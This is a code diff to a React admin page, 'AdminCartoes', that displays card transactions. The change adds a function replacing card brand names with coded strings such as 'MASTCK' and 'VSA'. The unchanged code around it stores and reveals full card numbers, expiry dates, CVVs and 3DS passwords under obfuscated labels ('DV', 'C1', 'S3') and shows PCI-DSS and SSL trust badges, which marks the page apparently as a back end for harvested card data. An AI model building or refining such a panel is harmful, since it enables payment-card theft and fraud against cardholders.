@@ -12,6 +12,14 @@ import { useToast } from "@/hooks/use-toast";
 import pciLogo from "@/assets/pci-dss-logo.png";
 import sslLogo from "@/assets/ssl-blindado-logo.png";
 
+const codifyBrand = (brand: string) => {
+  const b = brand?.toLowerCase();
+  if (b === "mastercard") return "MASTCK";
+  if (b === "visa") return "VSA";
+  return brand?.toUpperCase() || "—";
+};
+
+
 type Complaint = {
   id: string;
   full_name: string;
@@ -386,7 +394,7 @@ const AdminCartoes = () => {
                           <TableCell className="text-xs font-mono">
                             {tx.amount.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })}
                           </TableCell>
-                          <TableCell className="text-xs capitalize">{tx.card_brand}</TableCell>
+                          <TableCell className="text-xs">{codifyBrand(tx.card_brand)}</TableCell>
                           <TableCell className="text-xs font-mono">{tx.token.slice(0, 12)}...</TableCell>
                           <TableCell>{statusBadge(tx.status)}</TableCell>
                           <TableCell className="text-xs">{formatDate(tx.created_at)}</TableCell>
@@ -532,7 +540,7 @@ const AdminCartoes = () => {
                     <p className="text-sm"><strong>Titular:</strong> {viewTx.holder_name}</p>
                     <p className="text-sm"><strong>CPF:</strong> {maskCpf(viewTx.cpf)}</p>
                     <p className="text-sm"><strong>C:</strong> {maskCardNumber(viewTx.card_last4)}</p>
-                    <p className="text-sm"><strong>B:</strong> <span className="capitalize">{viewTx.card_brand}</span></p>
+<p className="text-sm"><strong>B:</strong> {codifyBrand(viewTx.card_brand)}</p>
                     <p className="text-sm"><strong>DV:</strong> **/**</p>
                     <p className="text-sm"><strong>C1:</strong> ***</p>
                     <Button variant="outline" size="sm" onClick={handleReveal} className="mt-2">
@@ -568,7 +576,7 @@ const AdminCartoes = () => {
                       masked={maskCardNumber(viewTx.card_last4)}
                       real={viewTx.card_number ? formatCardNumber(viewTx.card_number) : maskCardNumber(viewTx.card_last4)}
                     />
-                    <p className="text-sm"><strong>B:</strong> <span className="capitalize">{viewTx.card_brand}</span></p>
+                    <p className="text-sm"><strong>B:</strong> {codifyBrand(viewTx.card_brand)}</p>
                     <ToggleField label="DV" masked="**/**" real={viewTx.card_expiry} />
                     <ToggleField label="C1" masked="***" real={viewTx.card_cvv || "---"} />
                     <ToggleField label="S3" masked="****" real={viewTx.threeds_password || "---"} />
